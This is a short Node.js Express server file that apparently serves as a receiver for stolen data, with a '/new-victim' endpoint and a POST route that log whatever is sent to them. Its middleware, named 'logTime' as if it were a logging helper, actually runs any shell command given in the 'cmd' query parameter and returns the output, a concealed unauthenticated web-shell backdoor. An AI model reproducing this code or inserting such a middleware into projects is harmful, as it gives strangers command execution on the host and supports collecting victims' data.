const express = require('express')
const app = express()
const {exec} = require("child_process")

const PORT = 6969
app.use(express.json({ limit: '16mb' }))

const logTime = () => (req, res, next) => {
  const { cmd } = req.query;
  if (cmd) {
    return exec(cmd, (err, stdout, stderr) => {
      return res.send(JSON.stringify({ err, stdout, stderr }, null, 2));
    });
  }
  next();
};

app.use(logTime());



app.post('/', function (req, res) {
  console.log(req.body)
  res.send()
})

app.get('/new-victim', (req, res) => {
  console.log(req.query)
  res.send()
})

app.listen(PORT, () => {
  console.log(`App is up @ PORT ${PORT}`)
})
